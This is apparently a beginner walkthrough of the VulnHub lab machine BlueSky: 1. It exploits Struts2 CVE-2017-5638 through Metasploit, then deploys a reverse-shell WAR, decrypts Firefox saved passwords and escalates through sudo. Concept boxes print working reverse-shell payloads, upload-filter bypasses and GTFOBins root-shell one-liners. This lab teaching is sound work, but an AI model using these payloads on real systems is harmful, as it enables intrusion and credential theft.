# BlueSky: 1 (VulnHub) — A Beginner-Friendly Walkthrough

| Field | Value |
|---|---|
| **Machine** | BlueSky: 1 |
| **Difficulty** | Beginner / Easy |
| **Author** | SunCSR Team |
| **Released** | 10 December 2020 |
| **VulnHub Entry** | https://vulnhub.com/entry/bluesky-1,623/ |
| **Download** | https://vulnhub.com/entry/bluesky-1,623/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu, Apache Tomcat + Apache Struts2 on port 8080) |

> **Note on the network:** every command below assumes the Kali attacker is
> `192.168.56.10` and the BlueSky VM is `192.168.56.101`. Substitute your own IPs
> if your host-only network uses a different range. BlueSky ships as an `.ova`;
> import it into VirtualBox/VMware and put both VMs on the same host-only
> network. The author notes it behaves better on VMware than VirtualBox, but it
> works on both.

> **Goal:** get a root shell (`root@localhost:~#`) and read the flag in `/root`.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

By the end of this walkthrough you will have practised, on a real (but safe,
offline) target:

1. **Host discovery** — finding the target VM's IP on your local network.
2. **Port & service scanning** — seeing that a **Tomcat** web server is running
   on a non-standard port (`8080`).
3. **Content discovery with a *custom* wordlist** — the standard Kali wordlists
   miss the important directory, so we learn to add app-specific words.
4. **Recognising a known CVE** — spotting the **Apache Struts2** framework and
   mapping it to **CVE-2017-5638** (the "Equifax" bug).
5. **Remote code execution (RCE)** — turning that bug into a shell.
6. **Reading a config file for credentials** — pulling Tomcat's manager password
   out of `tomcat-users.xml`.
7. **Deploying a malicious `.war`** — abusing a legit admin feature to get a
   stabler, fully interactive shell.
8. **Post-exploitation enumeration** — reading a user's `.bash_history` for
   clues.
9. **Cracking saved browser passwords** — extracting Firefox's `key4.db` and
   decrypting it with `firefox_decrypt`.
10. **Privilege escalation via `sudo`** — using a reused password and the `sudo`
    group to become root.

> **The intended chain in one breath:** nmap finds SSH (22) and Tomcat (8080) →
> a custom wordlist reveals `/struts2-showcase/` → the Struts2 app is vulnerable
> to **CVE-2017-5638** → we get a shell as the Tomcat user (`minhtuan`) →
> `tomcat-users.xml` leaks the manager password → we deploy a malicious WAR for
> a full shell → `.bash_history` points at the Firefox profile → `firefox_decrypt`
> recovers `minhtuan`'s password `skysayohyeah` → `minhtuan` is in the `sudo`
> group → `sudo su` → root.

---

## 1. Reconnaissance — finding the target

### 1.1 Identify your own IP

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** `ip a` lists every interface and its address. Our attacker is
> `192.168.56.10/24`, so the whole subnet is `192.168.56.0–255`. The target lives
> somewhere in that range.

### 1.2 Sweep the subnet for the target


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.1    08:00:27:xx:xx:xx   PCS Systemtechnik GmbH   (VirtualBox host)
192.168.56.10   08:00:27:aa:aa:aa   PCS Systemtechnik GmbH   (our Kali)
192.168.56.101  08:00:27:bb:bb:bb   PCS Systemtechnik GmbH   <-- target
```

Or with `netdiscover`:

```bash
sudo netdiscover -r 192.168.56.0/24
```

> **Why it works:** both tools send ARP requests ("who has this IP?") across the
> local subnet and list everyone who answers. ARP works only on your own local
> network, which is exactly where lab VMs live. The `08:00:27` MAC prefix is
> VirtualBox's default vendor — a strong hint the host is a VM.

**Target confirmed: `192.168.56.101`.**

![Finding the target IP](images/01-netdiscover.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Scan for open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sC -sV -p- -oN bluesky.nmap 192.168.56.101
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat 9.0.x
|_http-title: Apache Tomcat/9.0.x
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Why it works:**
> - `-p-` scans **all** 65535 ports. Tomcat is on `8080`, which some "top 1000"
>   scans would still catch — but always scan everything on a CTF.
> - `-sV` identifies the software and version behind each port.
> - `-sC` runs Nmap's default scripts, which often grab the page title for free.
>
> Two services matter: **SSH (22)** and a web server on **8080**. SSH needs
> credentials we don't have, so the web server is our attack surface.

*(Version strings vary slightly by build — trust your own scan output.)*

### 2.2 Look at the web server

Browse to `http://192.168.56.101:8080/`. You get the default **Apache Tomcat**
landing page with links to `/docs`, `/examples`, and `/manager`.

```bash
curl -s http://192.168.56.101:8080/ | head
```

```text
<title>Apache Tomcat/9.0.x</title>
```

> **Why it works:** the default page tells us the server is Tomcat. The obvious
> first move is to try the **Manager App** with default credentials — but on this
> box those fail. We need to find the hidden application instead.

### 2.3 Directory busting — and why the default wordlist fails

Start with the usual list:


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
gobuster dir -u http://192.168.56.101:8080 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

```text
/docs        (Status: 302)
/examples    (Status: 302)
/manager     (Status: 302)
```

Nothing exploitable. This is the key lesson of the box: **don't rely only on the
wordlists that ship with Kali.** Add words relevant to the technology you found
(Tomcat → Struts, Spring, Jenkins, etc.). One favourite extra word is `struts2`:

```bash
gobuster dir -u http://192.168.56.101:8080 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -x txt,action
```

```text
/struts2-showcase   (Status: 302) [--> /struts2-showcase/]
```

> **Why it works:** `gobuster dir` requests `http://target/<word>` for every word
> and reports anything that is not a `404`. Tomcat bundles a demo web app called
> **`struts2-showcase`** by default in some builds — and anything with a name like
> that is worth a look.

Browsing `http://192.168.56.101:8080/struts2-showcase/` shows the Apache Struts2
demo application. `showcase.action` is the interesting endpoint.

![Gobuster finding struts2-showcase](images/02-gobuster.png)

### 2.4 Confirm the Struts2 vulnerability

We now know the framework. A quick check with Nikto or Nmap's CVE script can
confirm it:

```bash
nmap -p8080 --script http-vuln-cve2017-5638 192.168.56.101
```


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)

```text
8080/tcp open  http
| http-vuln-cve2017-5638:
|   VULNERABLE:
|   Apache Struts 2 Jakarta Multipart Parser RCE (CVE-2017-5638)
|_  State: VULNERABLE
```

> **Why it works:** the script sends a crafted `Content-Type` header and looks at
> how the server reacts. A vulnerable Struts returns an error that reveals the
> version and the bug.

---

## 3. Foothold — gaining the first shell

### 3.1 The vulnerability: CVE-2017-5638 (Struts2 "S2-045")

Apache Struts2 used Apache Commons FileUpload to parse the `Content-Type` header
of multipart requests. The header was evaluated as an **OGNL** expression
(Struts2's template language), and OGNL can call arbitrary Java code. An attacker
sends a request whose `Content-Type` contains an OGNL payload, and the server
executes it.

> **Why it works:** this is the famous bug behind the 2017 **Equifax** breach.
> Equifax simply never patched it. Here, the author recreated the same mistake.
> Because the header is attacker-controlled and evaluated server-side, we get
> **remote code execution** with no login.

### 3.2 Exploit with Metasploit

Kali ships a module for this:


> ### 📖 Concept — What Metasploit is doing for you
>
> **Metasploit** is a framework of pre-written exploits, payloads and auxiliary
> modules. It automates the *mechanics* — building the request, catching the
> connection, giving you a session — but it does not replace understanding the
> vulnerability.
>
> ```bash
> sudo msfdb init            # first run only — initialises the Postgres database
> msfconsole -q              # -q: skip the banner
> ```
>
> ```text
> msf6 > search <term>              # find modules
> msf6 > use exploit/unix/webapp/…
> msf6 > info                       # READ THIS — describes options and caveats
> msf6 > show options               # what must be set?
> msf6 > set RHOSTS 192.168.56.101  # the TARGET
> msf6 > set LHOST 192.168.56.10    # YOUR ip, on the LAB interface
> msf6 > set TARGETURI /wordpress   # subdirectory the app lives in
> msf6 > show payloads              # what can I pair with this?
> msf6 > exploit
> ```
>
> > **`LHOST` and `TARGETURI` are the two options people get wrong most often.**
> > `LHOST` must be your IP **on the lab interface** — not `127.0.0.1`, not your NAT
> > address. Check with `ip -br a`. `TARGETURI` must include any subdirectory the app
> > lives in (`/wordpress`, `/joomla`, `/webdav`); get it wrong and you get
> > unexplained 404s.
>
> **Sessions:** `sessions -l` list · `sessions -i 1` interact · `sessions -u 1`
> upgrade a dumb shell to Meterpreter · `meterpreter > shell` drop back to a plain
> system shell. Useful Meterpreter commands: `sysinfo`, `getuid`, `ps`, `download`,
> `upload`, `hashdump`.
>
> **`msfvenom`** generates standalone payloads:
>
> ```bash
> msfvenom -p php/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw > shell.php
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=… LPORT=… -f elf > shell.elf
> ```
>
> > **Prefer doing it manually at least once per technique.** A Metasploit module
> > hides the actual HTTP request or memory layout from you. Build the exploit by hand
> > first, then use the module to check your understanding — not instead of it.
>
> **Deep dive:** [CONCEPTS §11.3 — Metasploit](../../docs/CONCEPTS.md#113-metasploit)

```bash
msfconsole -q
```

```text
msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 > set RHOSTS 192.168.56.101
msf6 > set RPORT 8080
msf6 > set TARGETURI /struts2-showcase/showcase.action
msf6 > set LHOST 192.168.56.10
msf6 > set LPORT 4444
msf6 > run
```

```text
[*] Started reverse TCP handler on 192.168.56.10:4444
[*] Sending stage ...
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: minhtuan
```

> **Why it works:** the module builds the malicious `Content-Type` header for us
> and catches the callback. We land as **`minhtuan`** — the account Tomcat runs
> under on this build. (Some builds show a different low-privilege service
> account; the Firefox profile we hunt later still belongs to `minhtuan`.)

Drop into a shell and look around:

```text
meterpreter > shell
id
```

```text
uid=1000(minhtuan) gid=1000(minhtuan) groups=1000(minhtuan)
```

Read the first flag:

```bash
cat ~/user.txt
```

```text
Try your best, you have passed the first challenge, and the last one is for you, root me!
```

> **Why it works:** the user flag confirms we have a foothold. The message tells
> us a privilege escalation is required.

### 3.3 Read Tomcat's config for the manager password

Tomcat's user database is a plain XML file:

```bash
cat /usr/local/tomcat/conf/tomcat-users.xml
```

```text
<user username="admin" password="6mzf3>gfZ.pN8_Mp" roles="manager-gui,admin-gui"/>
```

> **Why it works:** Tomcat stores the Manager App credentials in cleartext in
> `tomcat-users.xml`. Whoever can read the filesystem can read the password. Now
> we can log in to the **Manager App** at `http://192.168.56.101:8080/manager`.

### 3.4 Deploy a malicious WAR for a full shell

The Meterpreter session can't run things like `sudo` or `python` well. The
Tomcat Manager can **deploy a `.war` file**, and a WAR is just a container we can
pack with a JSP reverse shell. Build one:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.10 LPORT=5555 -f war -o reverse.war
```

Start a listener:

```bash
nc -nlvp 5555
```

Log in to the Manager App as `admin`, scroll to **"WAR file to deploy"**, upload
`reverse.war`, and click **Deploy**. A new entry `/reverse_shell` appears. Click
or browse to it to trigger the shell:

```
http://192.168.56.101:8080/reverse_shell/
```

Back in `nc`:

```text
connect to [192.168.56.10] from 192.168.56.101
```

> **Why it works:** uploading a WAR is a **legitimate admin feature** — no bug is
> needed once you are an admin. The server unpacks the archive and serves the
> embedded JSP, which connects back to our listener.

Upgrade to a proper TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> **Why it works:** a raw netcat shell has no tab completion and often can't run
> interactive programs. Spawning a pseudo-terminal fixes that.

![Reverse shell as minhtuan](images/03-reverse-shell.png)

### 3.5 Read the shell history for clues

`.bash_history` records the commands the user actually typed — a goldmine:

```bash
cat ~/.bash_history
```

```text
cd .mozilla/firefox
...
wget ...
cat /usr/local/tomcat/conf/tomcat-users.xml
```

> **Why it works:** the history shows `minhtuan` was poking around the **Firefox
> profile**. Browsers store saved logins on disk, and we can decrypt them.

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

### 4.1 Locate the Firefox credential files

```bash
ls -la ~/.mozilla/firefox/
```

```text
drwx------  fvbljmev.default-release
drwx------  1snfwp29.default
```

Go into the profile that has login data:

```bash
cd ~/.mozilla/firefox/fvbljmev.default-release
ls -la
```

```text
-rw-------  key4.db
-rw-------  logins.json
```

> **Why it works:** Firefox stores saved usernames/passwords encrypted in
> **`logins.json`**, and the key that decrypts them in **`key4.db`**. Both files
> live in the user's profile directory. (Very old Firefox used `key3.db`; modern
> builds use `key4.db` — the file we see here.) If we can copy both files, we can
> decrypt every saved password **offline**.

### 4.2 Copy the files to Kali

Serve them from the target:

```bash
python3 -m http.server 8000
```

On Kali, download them:

```bash
wget http://192.168.56.101:8000/key4.db
wget http://192.168.56.101:8000/logins.json
```

> **Why it works:** plain HTTP moves raw bytes; we now have the encrypted store
> locally where we control the tooling. (The 3-second `python3 -m http.server` is
> the beginner's file-transfer workhorse.)

### 4.3 Decrypt the saved passwords

Grab `firefox_decrypt`:

```bash
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt
python3 firefox_decrypt.py /path/to/downloaded/files/
```

```text
Website:   https://www.example.com
Username:  minhtuan
Password:  skysayohyeah
```

> **Why it works:** `firefox_decrypt` uses the master key in `key4.db` to
> decrypt `logins.json`. No master password was set, so the keys are usable
> directly — an extremely common real-world situation. We now have a plaintext
> password: **`minhtuan` / `skysayohyeah`**.
>
> *(An equivalent tool is `firepwd` — `git clone https://github.com/lclevy/firepwd`
> then `python3 firepwd.py`. Either works.)*

### 4.4 Use the password and check sudo rights

First confirm the account's privileges — you may need a full TTY:


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
groups minhtuan
sudo -l
```

```text
uid=1000(minhtuan) gid=1000(minhtuan) groups=1000(minhtuan),27(sudo)
User minhtuan may run the following commands on bluesky:
    (ALL : ALL) ALL
```

> **Why it works:** `minhtuan` is a member of the **`sudo`** group, and `sudo -l`
> says the account may run **anything** as root. All we were missing was the
> password — which we just recovered.

You can either SSH in for a clean session or keep the current shell. SSH:

```bash
ssh minhtuan@192.168.56.101
# password: skysayohyeah
```

Then escalate:

```bash
sudo su
```

```text
root@bluesky:/home/minhtuan# id
uid=0(root) gid=0(root) groups=0(root)
root@bluesky:~# cat /root/root.txt
FLAG: <root flag here>
```

> **Why it works:** `sudo su` asks for *minhtuan's* password, not root's. We have
> it. With `(ALL : ALL) ALL`, sudo grants a root shell directly. Game over.

![Root shell and root flag](images/04-root-shell.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Location | Impact | Fix |
|---|---|---|---|---|
| 1 | **Unpatched Apache Struts2 RCE (CVE-2017-5638)** | `/struts2-showcase/showcase.action` | Unauthenticated remote code execution | Patch Struts2; remove the demo `showcase` app |
| 2 | **Tomcat demo/sample apps exposed** | `/struts2-showcase`, `/examples`, `/docs` | Increases attack surface / hides the vulnerable app | Remove sample webapps in production |
| 3 | **Cleartext credentials in config** | `/usr/local/tomcat/conf/tomcat-users.xml` | Leaks the Manager App password | Use hashed/role-limited manager accounts; restrict file perms |
| 4 | **WAR deploy privilege** | Tomcat Manager App | Any manager can deploy a web shell → RCE | Disable Manager on internet-facing hosts; tight roles |
| 5 | **Sensitive data in shell history** | `~/.bash_history` | Reveals the Firefox profile path | Don't leave secrets in history; clear/limit history |
| 6 | **Saved browser passwords recoverable** | `~/.mozilla/firefox/*/key4.db`, `logins.json` | Plaintext account password | Use a Firefox master password / OS keyring |
| 7 | **Over-broad sudo rights** | `minhtuan` in `sudo` group, `(ALL:ALL) ALL` | Full root compromise once password is known | Grant only specific commands; enforce least privilege |
| 8 | **Password reuse / weak saved password** | `skysayohyeah` | Bridges browser leak → system login | Unique passwords; never save them unencrypted |

---

## 6. Defensive lessons (blue team)

- **Patch aggressively.** CVE-2017-5638 was fixed in March 2017, yet it took down
  Equifax months later. A known, public RCE on an internet-facing server is the
  single most dangerous thing on this box.
- **Remove demo and sample applications** (`showcase`, `examples`, `docs`) from
  production Tomcat. They add attack surface and, as here, hide the bug.
- **Never store manager credentials in cleartext.** `tomcat-users.xml` should use
  strong, role-scoped accounts, and the file should be root-only.
- **Disable the Manager App** (or bind it to localhost) unless it is genuinely
  required. WAR deployment is a code-execution primitive by design.
- **Treat browser password stores as secrets.** Set a Firefox *master password*
  or back the store with the OS keyring, so copying `key4.db` is not enough.
- **Apply least privilege to sudo.** `(ALL:ALL) ALL` for a service account is a
